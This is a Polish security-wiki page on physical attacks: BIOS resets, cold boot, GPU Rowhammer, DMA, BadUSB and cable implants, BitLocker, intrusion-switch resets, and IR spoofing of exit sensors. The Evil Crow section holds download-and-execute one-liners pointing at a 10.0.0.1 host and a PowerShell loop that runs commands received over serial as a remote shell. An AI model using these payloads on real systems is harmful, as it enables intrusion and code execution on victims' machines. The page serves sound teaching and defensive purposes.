# Ataki fizyczne

{{#include ../banners/hacktricks-training.md}}

Informacje o wykrywaniu interfejsów na poziomie płytki, konsolach szeregowych, dostępie do pamięci flash, side-channelach i glitchingu znajdziesz w sekcji [Hardware Hacking](hardware-hacking/README.md) oraz w rozdziałach dotyczących poszczególnych interfejsów. Ta strona opisuje ataki wymagające fizycznego dostępu do całego systemu.

## Odzyskiwanie hasła BIOS-u i bezpieczeństwo systemu

Ustawienia firmware'u starszych komputerów PC można zresetować, odłączając baterię CMOS lub używając opisanego w dokumentacji zworki clear-CMOS. Wymagany czas odłączenia zasilania zależy od płyty. Hasła UEFI lub klucze w nowoczesnych systemach mogą być przechowywane w nieulotnej pamięci flash, wbudowanym kontrolerze lub urządzeniu zabezpieczającym, dlatego ich usunięcie może nie nastąpić po wyjęciu baterii. Przed zwarciem pinów zapoznaj się z instrukcją obsługi lub serwisową płyty; ta procedura może również unieważnić pomiary TPM i wywołać odzyskiwanie szyfrowania dysku.

W starszych systemach x86 narzędzia takie jak **killCMOS** i **CmosPwd** mogą odczytywać lub zmieniać ustawienia przechowywane w CMOS ze środowiska rozruchowego. CmosPwd rozpoznaje formaty haseł w określonym, udokumentowanym zbiorze starszych rodzin BIOS-u i może tworzyć kopię zapasową, przywracać lub usuwać/zerować stan CMOS; opublikowane wersje są przeznaczone dla starszych środowisk DOS/Windows, Linux, FreeBSD i NetBSD.<sup>[[18]](#references)</sup> Narzędzia te nie służą do usuwania dowolnych haseł UEFI i wymagają odpowiedniego dostępu do sprzętu/firmware'u.

Niektóre firmware'y laptopów wyświetlają kod wyzwania specyficzny dla producenta po kilku nieudanych próbach podania hasła. Bazy danych, takie jak [bios-pw.org](https://bios-pw.org), mogą dla niektórych modeli wyliczyć starsze hasła odzyskiwania producenta, ale wiele systemów stosuje blokadę bez możliwego do wyliczenia kodu wyzwania. Traktuj wygenerowane hasło jako specyficzne dla danego modelu i unikaj wyczerpania liczników prób, których nie można zresetować.

### Zabezpieczenia UEFI

W nowoczesnych systemach **UEFI** CHIPSEC może przeprowadzić audyt zabezpieczeń zmiennych Secure Boot. Najpierw wykonaj poniższy test, który nie wprowadza zmian; opcjonalny tryb `-a modify` celowo próbuje uszkodzić zmienne i powinien być używany wyłącznie w systemie laboratoryjnym, który można przywrócić. CHIPSEC ostrzega, że jego uprzywilejowany sterownik i dostęp do sprzętu niskiego poziomu nie nadają się do użycia na systemach produkcyjnych.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## Analiza RAM i ataki cold boot

DRAM nie traci od razu wszystkich bitów po zatrzymaniu odświeżania. Tempo zanikania danych znacznie różni się w zależności od technologii modułu i temperatury; chłodzenie może zachować użyteczne dane znacznie dłużej niż cykl wyłączenia i ponownego uruchomienia bez chłodzenia. Atak cold-boot polega na szybkim ponownym uruchomieniu systemu do małego środowiska akwizycji danych lub przeniesieniu schłodzonego modułu, przechwyceniu surowej pamięci i odtworzeniu kluczy kryptograficznych mimo zanikania bitów. Narzędzie do kopiowania dysków nie jest automatycznie narzędziem do obrazowania pamięci fizycznej, a Volatility analizuje zrzut, zamiast go pozyskiwać; używaj zweryfikowanego narzędzia do akwizycji danych odpowiedniego dla danej platformy.<sup>[[12]](#references)</sup>

---

## Rowhammer na GPU wymierzony w tablice stron

Nowoczesne ataki Rowhammer na GPU są znacznie bardziej użyteczne, gdy ich celem są **metadane pamięci wirtualnej GPU**, a nie zwykłe bufory. Najnowsze badania nad **kartami NVIDIA Ampere z pamięcią GDDR6** pokazują, że atakujący uruchamiający nieuprzywilejowany kod CUDA może tworzyć wzorce hammeringu specyficzne dla GPU, używać **memory massaging**, by umieszczać struktury stronicowania w podatnych wierszach, a następnie odwracać bity w **tablicy stron ostatniego poziomu** lub pośrednim **katalogu stron**. Po uszkodzeniu pojedynczego wpisu translacji atakujący może uzyskać **dowolny odczyt/zapis pamięci GPU**, a następnie przejść do kompromitacji hosta.<sup>[[1]](#references)[[2]](#references)</sup>

### Schemat exploita

1. **Profiluj podatne na hammering wiersze** w GDDR6 i twórz wzorce hammeringu uwzględniające odświeżanie i nieregularny dostęp, które omijają zabezpieczenia wbudowane w DRAM.
2. **Manipuluj alokacjami GPU**, aby sterownik umieszczał struktury translacji stron w podatliwych lokalizacjach fizycznych, zamiast pozostawiać je w domyślnej chronionej puli. W praktyce może to oznaczać wyczerpanie obszaru tablic stron niskiej pamięci i zalanie systemu dużymi, rzadkimi mapowaniami UVM o kontrolowanych odstępach.
3. **Odwracaj bity metadanych translacji**, takich jak **PFN** lub bity związane z aperturą, we wpisie tablicy stron/katalogu stron, tak aby kontrolowana przez atakującego strona wirtualna wskazywała strony tablic stron, dowolną pamięć GPU lub mapowania systemowe widoczne dla hosta.
4. Wykorzystaj sfałszowane mapowanie do modyfikowania kolejnych wpisów translacji i uzyskania **dowolnego odczytu/zapisu pamięci GPU** w różnych kontekstach GPU.

### Przejście do hosta i zabezpieczenia

- Przy **wyłączonym IOMMU** sfałszowane mapowania apertury systemowej mogą udostępnić GPU dowolną **pamięć fizyczną hosta**, zmieniając prymityw GPU w pełną kompromitację hosta.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** atakuje wpisy tablic stron ostatniego poziomu, natomiast **GeForge** pokazuje, że łatwiejsze może być uszkodzenie poziomu katalogu stron, ponieważ odwrócenie jednego bitu może przekierować większe poddrzewo translacji. Nie traktuj tylko jednej warstwy stronicowania jako krytycznej dla bezpieczeństwa.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** nadal ma znaczenie, ponieważ blokuje bezpośrednią ścieżkę dostępu do dowolnej pamięci hosta wykorzystywaną przez GDDRHammer/GeForge, ale **nie stanowi pełnego zabezpieczenia**. **GPUBreach** pokazuje drugi etap ataku, w którym atakujący uszkadza zapisywalne przez GPU bufory CPU należące do sterownika, a następnie wywołuje błędy bezpieczeństwa pamięci w sterowniku NVIDIA, by uzyskać prymityw zapisu do jądra i **powłokę root**, nawet przy włączonym IOMMU.<sup>[[3]](#references)</sup>
- **ECC na poziomie systemu** to praktyczne wzmocnienie zabezpieczeń w obsługiwanych GPU do stacji roboczych i serwerów. Konsumenckie GPU bez ECC zapewniają słabszą ochronę.<sup>[[4]](#references)</sup>
- Ataki te nie są czysto teoretyczne: **GeForge** zgłosił **1,171** odwróconych bitów na RTX 3060 i **202** na RTX A6000, co wystarczyło do zbudowania działającego łańcucha eskalacji uprawnień hosta.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Ataki bezpośredniego dostępu do pamięci (DMA)

Informacje o offline’owym patchowaniu UEFI IFR/NVRAM, które może osłabić egzekwowanie IOMMU przed rozruchem i umożliwić atak DMA na Windows, znajdziesz tutaj:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** demonstruje pozyskiwanie i modyfikowanie pamięci przez DMA za pośrednictwem interfejsów takich jak FireWire i wczesne konfiguracje Thunderbolt, w tym historyczne sygnatury omijania logowania. Nie jest po prostu „nieskuteczny wobec Windows 10”: możliwość wykorzystania zależy od interfejsu, kompilacji systemu, zasad IOMMU, stanu blokady oraz tego, czy funkcja Windows Kernel DMA Protection jest obsługiwana i włączona. Windows 10 w wersji 1803 i nowszych wprowadził Kernel DMA Protection na zgodnych platformach, znacznie zmieniając powierzchnię ataku.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Dostęp do systemu za pomocą Live CD/USB

Na niezaszyfrowanym lub już odblokowanym woluminie Windows środowisko offline może zastąpić pliki binarne ułatwień dostępu, takie jak **sethc.exe** lub **Utilman.exe**, plikiem **cmd.exe**, zapewniając wiersz polecenia SYSTEM po użyciu odpowiedniego skrótu na ekranie logowania. Narzędzia takie jak **chntpw** mogą edytować dane lokalnych kont SAM. Metody te nie omijają blokady woluminu BitLocker i mogą uszkodzić poświadczenia chronione przez DPAPI/EFS; zachowuj kopie śledcze i kopie zapasowe.

**Kon-Boot** to komercyjne narzędzie do omijania uwierzytelniania podczas rozruchu, przeznaczone dla obsługiwanych konfiguracji Windows/macOS. Zgodność zależy od systemu operacyjnego, trybu firmware, Secure Boot i konfiguracji szyfrowania dysku; narzędzie nie odszyfrowuje zablokowanego woluminu BitLocker.<sup>[[10]](#references)</sup>

---

## Obsługa funkcji zabezpieczeń Windows

### Skróty rozruchu i odzyskiwania

- **Delete/Supr**, F2, F10 lub inny klawisz określony przez producenta może otworzyć konfigurację firmware.
- **F8** otwiera starsze zaawansowane opcje rozruchu Windows tylko w konfiguracjach, w których ta ścieżka jest nadal dostępna; obecnie sposób wejścia do odzyskiwania może się różnić.
- Przytrzymanie **Shift** może w niektórych konfiguracjach wyłączyć automatyczne logowanie do Windows, choć ustawienia zasad/rejestru mogą wyłączyć to zachowanie.<sup>[[17]](#references)</sup>

### Urządzenia BAD USB

Urządzenia takie jak **USB Rubber Ducky** i płytki Teensy mogą zgłaszać się jako zaufane klawiatury HID i wprowadzać wcześniej zdefiniowane sekwencje klawiszy. Początkowo payload ma uprawnienia i dostęp do pulpitu takie jak zalogowana sesja; ograniczają go jednak monity UAC, blokada ekranu, układ klawiatury, czas wykonania i zasady USB punktu końcowego.<sup>[[15]](#references)</sup>

Programowalne urządzenia peryferyjne mogą również atakować parsery jądra hosta i koordynować działanie kilku urządzeń USB w celu groomingu sterty i ujawnienia informacji:

{{#ref}}
../binary-exploitation/linux-kernel-exploitation/usb-audio-descriptor-oob-kaslr-leak.md
{{#endref}}

Przypadek parsera pamięci masowej Windows UAS opisano tutaj:

{{#ref}}
../binary-exploitation/windows-kernel-exploitation/uasp-report-luns-cache-size-oob-write.md
{{#endref}}

### Volume Shadow Copy

Uprawnienia administratora lub uprawnienia do tworzenia kopii zapasowych pozwalają utworzyć kopię w tle lub zapisać gałęzie rejestru, aby można było pozyskać zablokowane pliki, takie jak **SAM** i **SYSTEM**. Jest to technika pozyskiwania danych po kompromitacji, a nie metoda omijania eskalacji uprawnień; należy skorelować ją ze zdarzeniami `diskshadow`/VSS i eksportem gałęzi rejestru.

## Techniki implantów BadUSB / HID

### Urządzenie HID Androida wyzwalane przez NFC

Zrootowany telefon z Androidem może działać jako programowalna klawiatura USB tylko wtedy, gdy kontroler USB i jądro obsługują **USB gadget/HID**. Na zgodnych urządzeniach Kali NetHunter udostępnia profile gadgetów za pośrednictwem **USB Arsenal**. Inną opcją jest [USB Gadget Tool](https://github.com/tejado/android-usb-gadget), który tworzy funkcje gadgetów ConfigFS i może udostępniać urządzenia znakowe klawiatury/myszy, takie jak `/dev/hidg0` i `/dev/hidg1`. Narzędzie tworzy jedynie punkt końcowy gadgetu; osobny proces musi zapisywać do niego raporty HID. Dostęp root nie zastąpi jądra, w którym brakuje ConfigFS, obsługi HID gadget lub użytecznego kontrolera USB Device Controller.<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

Ten punkt końcowy można połączyć z NFC w Androidzie, aby uzyskać fizyczny wyzwalacz. Aplikacja [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID) odczytuje UID tagu, konwertuje go do oczekiwanej postaci, sprawdza lokalną listę dozwolonych wartości i po dopasowaniu wysyła skonfigurowaną sekwencję klawiszy w stylu Rubber Ducky. Podłączony host widzi zwykłe wejście z klawiatury i nie potrzebuje oprogramowania NFC.<sup>[[22]](#references)[[24]](#references)</sup>

Przed użyciem skrótów lub poleceń sprawdź enumerację urządzenia i układ klawiatury w pustym edytorze tekstu. Nieszkodliwy payload:<sup>[[24]](#references)</sup>

```text
DELAY 1000
STRING NFC HID test successful
ENTER
```

Ważne granice zaufania:<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

- **UID whitelist to identyfikacja, a nie uwierzytelnianie**. UID są publiczne, a niektóre typy tokenów lub emulatory pozwalają na klonowanie albo podszywanie się. Skopiowany dozwolony UID przechodzi tę samą ścieżkę obsługi co oryginalny token.
- Moduł Magisk **NfcScreenOff** modyfikuje usługę NFC tak, by zachowywała się, jakby ekran był włączony i odblokowany. Jeśli telefon jest już podłączony do hosta, ktoś może uruchomić payload bez odblokowywania telefonu.
- Hasła, tokeny API i polecenia zapisane w payloadzie to możliwe do odzyskania sekrety na urządzeniu z rootem lub odblokowanym bootloaderem. Wpisywanie hasła przez HID to automatyzacja z użyciem wielokrotnie wykorzystywanego hasła, a nie uwierzytelnianie bezhasłowe.
- Wstrzykiwanie HID działa z uprawnieniami aktywnego pulpitu i zależy od fokusu, czasu oraz układu klawiatury hosta. Wymagaj niedawnego potwierdzenia użytkownika przed uruchomieniem wrażliwych działań, unikaj umieszczania uprzywilejowanych sekretów w skryptach i używaj uwierzytelniacza kryptograficznego z mechanizmem challenge-response do rzeczywistego uwierzytelniania.

### Implanty kablowe zarządzane przez Wi-Fi

- Implanty oparte na ESP32-S3, takie jak **Evil Crow Cable Wind**, ukrywają się wewnątrz kabli USB-A→USB-C lub USB-C↔USB-C, zgłaszają się wyłącznie jako klawiatura USB i udostępniają swój stos C2 przez Wi-Fi. Operator musi jedynie zasilić kabel z hosta ofiary, utworzyć hotspot o nazwie `Evil Crow Cable Wind` z hasłem `123456789` i przejść do [http://cable-wind.local/](http://cable-wind.local/) (lub jego adresu DHCP), aby uzyskać dostęp do wbudowanego interfejsu HTTP.<sup>[[8]](#references)</sup>
- Interfejs przeglądarkowy udostępnia karty *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* i *Config*. Zapisane payloady są oznaczane według systemu operacyjnego, układy klawiatury można zmieniać w locie, a ciągi VID/PID — modyfikować, by naśladować znane urządzenia peryferyjne.
- Ponieważ C2 znajduje się wewnątrz kabla, telefon może przygotowywać payloady, uruchamiać je i zarządzać poświadczeniami Wi-Fi bez korzystania z sieci organizacji — przydatne podczas krótkotrwałych fizycznych włamań.

### Payloady AutoExec rozpoznające system operacyjny

- Reguły AutoExec przypisują jeden lub więcej payloadów do natychmiastowego uruchomienia po enumeracji USB. Implant przeprowadza uproszczone rozpoznanie systemu operacyjnego i wybiera pasujący skrypt.
- Przykładowy przebieg:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) lub `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Ponieważ wykonanie odbywa się bez nadzoru, samo podmienienie kabla do ładowania może zapewnić początkowy dostęp typu „plug-and-pwn” w kontekście zalogowanego użytkownika.

### Zdalna powłoka przez Wi-Fi TCP uruchamiana za pomocą HID

1. **Bootstrap za pomocą naciśnięć klawiszy:** Zapisany payload otwiera konsolę i wkleja pętlę, która wykonuje wszystko, co nadejdzie przez nowe urządzenie USB serial. Minimalny wariant dla Windows to:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Most kablowy:** Implant utrzymuje otwarty kanał USB CDC, podczas gdy jego ESP32-S3 uruchamia klienta TCP (skrypt Python, APK na Androida lub plik wykonywalny na komputer) łączącego się z operatorem. Każdy bajt wpisany w sesji TCP jest przekazywany do powyższej pętli szeregowej, co umożliwia zdalne wykonywanie poleceń nawet na hostach odizolowanych od sieci. Możliwości odbierania danych są ograniczone, dlatego operatorzy zwykle uruchamiają polecenia bez podglądu wyników (tworzenie kont, przygotowywanie dodatkowych narzędzi itp.).

### Powierzchnia aktualizacji OTA przez HTTP

- Udokumentowany interfejs Evil Crow Cable Wind udostępnia nieuwierzytelniony endpoint aktualizacji firmware’u pod adresem `/update`:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Operatorzy terenowi mogą wymieniać funkcje na gorąco (np. wgrywać firmware USB Army Knife) w trakcie operacji, bez otwierania kabla. Dzięki temu implant może przejść do nowych możliwości, pozostając podłączony do komputera docelowego.

## Obchodzenie szyfrowania BitLocker

Autoryzowane pozyskanie danych kryminalistycznych z działającego lub niedawno uruchomionego systemu może ujawnić klucz główny woluminu BitLocker lub powiązane materiały kluczowe, gdy wolumin jest odblokowany. Komercyjne narzędzia, takie jak Elcomsoft Forensic Disk Decryptor i Passware Kit Forensic, mogą przeszukiwać obsługiwane obrazy pamięci, pliki hibernacji lub zrzuty awaryjne, ale nie gwarantują powodzenia. Nowoczesny Windows szyfruje również zrzuty awaryjne, gdy BitLocker jest włączony, a zapisane 48-cyfrowe hasło odzyskiwania to inny artefakt niż klucz woluminu przechowywany w pamięci.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Social Engineering w celu dodania klucza odzyskiwania

Atakujący, który nakłoni administratora do uruchomienia poleceń do zarządzania BitLockerem, może dodać protector w postaci hasła odzyskiwania, klucza zewnętrznego lub innego typu, a następnie go przechwycić. Hasło odzyskiwania nie może być dowolnym ciągiem zer: numeryczne hasła odzyskiwania BitLocker muszą mieć zweryfikowany format 48 cyfr. Odpowiednia składnia do autoryzowanego zarządzania to `manage-bde -protectors -add C: -recoverypassword`; listę utworzonych protectorów wyświetla polecenie `manage-bde -protectors -get C:`. Monitoruj dodawanie protectorów i upewnij się, że nowe materiały odzyskiwania są escrowowane wyłącznie w zatwierdzonych lokalizacjach.<sup>[[16]](#references)</sup>

---

## Wykorzystanie przełączników otwarcia obudowy / konserwacyjnych do przywrócenia ustawień fabrycznych BIOS-u

Wiele nowoczesnych laptopów i komputerów stacjonarnych o małej obudowie ma **przełącznik otwarcia obudowy**, monitorowany przez Embedded Controller (EC) i firmware BIOS/UEFI. Głównym zadaniem przełącznika jest zgłaszanie alertu po otwarciu urządzenia, ale niektórzy producenci wdrażają **nieudokumentowany skrót odzyskiwania**, uruchamiany po przełączeniu go w określonej sekwencji.<sup>[[5]](#references)[[6]](#references)</sup>

### Jak działa atak

1. Przełącznik jest podłączony do **przerwania GPIO** w EC.
2. Firmware działający na EC śledzi **czas i liczbę naciśnięć**.
3. Po rozpoznaniu zakodowanej na stałe sekwencji EC uruchamia procedurę *mainboard-reset*, która **usuwa zawartość systemowej pamięci NVRAM/CMOS**.
4. Przy następnym uruchomieniu modele, których dotyczy problem, wczytują zresetowany stan firmware. W zależności od producenta i rewizji wyczyszczony stan może obejmować hasło administratora, niestandardowe ustawienia rozruchu lub zarejestrowane klucze Secure Boot; stan TPM i skutki dla szyfrowania dysku należy ocenić oddzielnie.

> Reset firmware może przywrócić opcje uruchamiania z nośników zewnętrznych, ale **nie** odszyfrowuje pamięci masowej. Po zmianach TPM/firmware BitLocker lub inny system szyfrowania całego dysku może zażądać odzyskiwania, nadal chroniąc dysk wewnętrzny bez klucza odzyskiwania.<sup>[[16]](#references)</sup>

### Przykład z życia — laptop Framework 13

Skrót odzyskiwania w Framework 13 (11., 12. i 13. generacji) działa następująco:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

Po dziesiątym cyklu EC ustawia flagę, która nakazuje BIOS-owi wyczyścić NVRAM przy następnym ponownym uruchomieniu. Cała procedura trwa ~40 s i wymaga **wyłącznie śrubokręta**.<sup>[[5]](#references)</sup>

### Ogólna procedura wykorzystania

1. Włącz lub uśpij i wybudź urządzenie docelowe, aby EC działał.
2. Zdejmij dolną pokrywę, aby odsłonić przełącznik wykrywania otwarcia/serwisowy.
3. Odtwórz wzorzec przełączeń specyficzny dla danego producenta (sprawdź dokumentację i fora albo przeprowadź inżynierię wsteczną firmware'u EC).
4. Złóż urządzenie i uruchom je ponownie, a następnie sprawdź, które ustawienia firmware'u i dane uwierzytelniające faktycznie uległy zmianie.
5. Jeśli masz upoważnienie i możliwe jest uruchomienie z zewnętrznego nośnika, uruchom kontrolowany obraz live. Po legalnym odblokowaniu woluminu wewnętrznego (lub jeśli nigdy nie był szyfrowany) środowisko live może pozyskać dane uwierzytelniające i dane albo zbadać partycję EFI System. Modyfikowanie tej partycji w celu zainstalowania implantu EFI jest trwałe i wysoce inwazyjne, a jego możliwości nadal ograniczają Secure Boot, measured boot, ochrona przed zapisem firmware'u i monitorowanie punktów końcowych. Zaszyfrowane nośniki pozostają niedostępne bez klucza lub materiału odzyskiwania.

### Wykrywanie i ograniczanie ryzyka

* Rejestruj zdarzenia wykrycia otwarcia obudowy w konsoli zarządzania systemem operacyjnym i koreluj je z nieoczekiwanymi resetami BIOS-u.
* Stosuj **plomby zabezpieczające przed naruszeniem** na śrubach/pokrywach, aby wykrywać otwarcie.
* Przechowuj urządzenia w **fizycznie kontrolowanych obszarach**; zakładaj, że dostęp fizyczny oznacza pełne przejęcie.
* Jeśli to możliwe, wyłącz funkcję producenta „reset przez przełącznik serwisowy” lub wymagaj dodatkowej autoryzacji kryptograficznej przy resetowaniu NVRAM.

---

## Ukryta iniekcja IR przeciwko bezdotykowym czujnikom wyjścia

### Charakterystyka czujnika
- Powszechnie dostępne czujniki „wave-to-exit” łączą emiter diody near-IR z odbiornikiem w stylu odbiornika pilota TV, który zgłasza stan logiczny wysoki dopiero po wykryciu wielu impulsów (~4–10) o prawidłowej częstotliwości nośnej (≈30 kHz).<sup>[[7]](#references)</sup>
- Plastikowa osłona uniemożliwia bezpośrednie wzajemne „widzenie się” emitera i odbiornika, więc kontroler zakłada, że każdy zweryfikowany sygnał nośny pochodzi od pobliskiego odbicia, i uruchamia przekaźnik otwierający elektrozaczep drzwi.
- Gdy kontroler uzna, że wykrył obiekt, często zmienia obwiednię modulacji sygnału wychodzącego, ale odbiornik nadal akceptuje każdą serię impulsów zgodną z filtrowaną częstotliwością nośną.

### Przebieg ataku
1. **Przechwyć profil emisji** – podłącz analizator stanów logicznych do pinów kontrolera, aby zarejestrować przebiegi przed wykryciem i po wykryciu, które sterują wewnętrzną diodą IR LED.
2. **Odtwarzaj wyłącznie przebieg „po wykryciu”** – usuń/zignoruj fabryczny emiter i steruj zewnętrzną diodą IR LED wzorcem, który pojawia się po wykryciu, już od samego początku. Ponieważ odbiornik sprawdza tylko liczbę impulsów/częstotliwość, uzna sfałszowany sygnał nośny za prawdziwe odbicie i ustawi linię przekaźnika.
3. **Steruj czasem transmisji** – nadawaj sygnał nośny w dostrojonych seriach (np. przez kilkadziesiąt milisekund, po czym rób podobnie długą przerwę), aby dostarczyć minimalną liczbę impulsów bez nasycania układu AGC odbiornika ani logiki obsługi zakłóceń. Ciągła emisja szybko zmniejsza czułość czujnika i uniemożliwia zadziałanie przekaźnika.

### Iniekcja odbiciowa na duże odległości
- Zastąpienie diody LED używanej na stanowisku testowym diodą IR dużej mocy, sterownikiem MOSFET i optyką skupiającą pozwala niezawodnie wyzwalać czujnik z odległości ~6 m.
- Atakujący nie musi mieć bezpośredniej widoczności do otworu odbiornika; skierowanie wiązki na wewnętrzne ściany, regały lub framugi widoczne przez szybę pozwala odbitej energii dotrzeć do pola widzenia ~30° i naśladować ruch ręką z bliskiej odległości.
- Ponieważ odbiorniki oczekują jedynie słabych odbić, znacznie silniejsza wiązka zewnętrzna może odbić się od wielu powierzchni i nadal przekraczać próg wykrywania.

### Zmodyfikowana latarka do ataku
- Ukrycie sterownika w komercyjnej latarce sprawia, że narzędzie pozostaje niezauważone. Zastąp widoczną diodę LED diodą IR LED dużej mocy dopasowaną do pasma odbiornika, dodaj ATtiny412 (lub podobny układ) do generowania serii impulsów ≈30 kHz i użyj MOSFET-a do odprowadzania prądu diody LED.
- Teleskopowa soczewka zoom zawęża wiązkę, zwiększając zasięg/precyzję, a silnik wibracyjny sterowany przez MCU zapewnia haptyczne potwierdzenie aktywnej modulacji bez emitowania widzialnego światła.
- Przełączanie kilku zapisanych wzorców modulacji (nieco różniących się częstotliwością nośną i obwiednią) zwiększa zgodność z różnymi rodzinami czujników sprzedawanymi pod innymi markami. Operator może kierować wiązkę na kolejne powierzchnie odbijające, aż usłyszy kliknięcie przekaźnika i zwolnienie drzwi.

---

## References

- [1] [GDDRHammer: znaczne zakłócanie wierszy DRAM — ataki Rowhammer między komponentami z użyciem współczesnych GPU](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: wykorzystanie GDDR do spreparowania tablic stron GPU dla zabawy i zysku](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: ataki eskalacji uprawnień na GPU z użyciem Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - komunikat bezpieczeństwa: Rowhammer - lipiec 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – „Framework 13. Naciśnij tutaj, aby przejąć kontrolę”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – przewodnik resetowania płyty głównej](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – „Nieee dotykaj! – omijanie bezdotykowych czujników wyjścia IR za pomocą ukrytej latarki IR”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – „Podłącz, uruchom, przejmij: hakowanie za pomocą Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - atak Rowhammer na układy NVIDIA](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Oficjalna dokumentacja Kon-Boot i informacje o zgodności](https://kon-boot.com/)
- [11] [Dokumentacja CHIPSEC - zabezpieczenia zmiennych Secure Boot](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Abyśmy nie zapomnieli: ataki cold boot na klucze szyfrujące](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - manipulowanie pamięcią fizyczną przez DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - ochrona DMA jądra](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Dokumentacja Hak5 USB Rubber Ducky](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - przewodnik po operacjach BitLocker](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - przytrzymanie klawisza Shift a automatyczne logowanie](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - dokumentacja i pliki do pobrania CmosPwd](https://www.cgsecurity.org/wiki/CmosPwd)
- [19] [Dokumentacja Kali Linux - NetHunter USB-Arsenal](https://www.kali.org/docs/nethunter/nethunter-usbarsenal/)
- [20] [Dokumentacja jądra Linux - sterownik USB HID gadget](https://docs.kernel.org/usb/gadget_hid.html)
- [21] [USB Gadget Tool](https://github.com/tejado/android-usb-gadget)
- [22] [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)
- [23] [NfcScreenOff](https://github.com/Jon8RFC/NfcScreenOff)
- [24] [Przekształć zrootowany telefon z Androidem w uwierzytelniacz NFC i narzędzie automatyzacji dla komputera](https://mobile-hacker.com/2026/09/21/turn-a-rooted-android-phone-into-an-nfc-authenticator-and-automation-tool-for-your-pc/)
{{#include ../banners/hacktricks-training.md}}
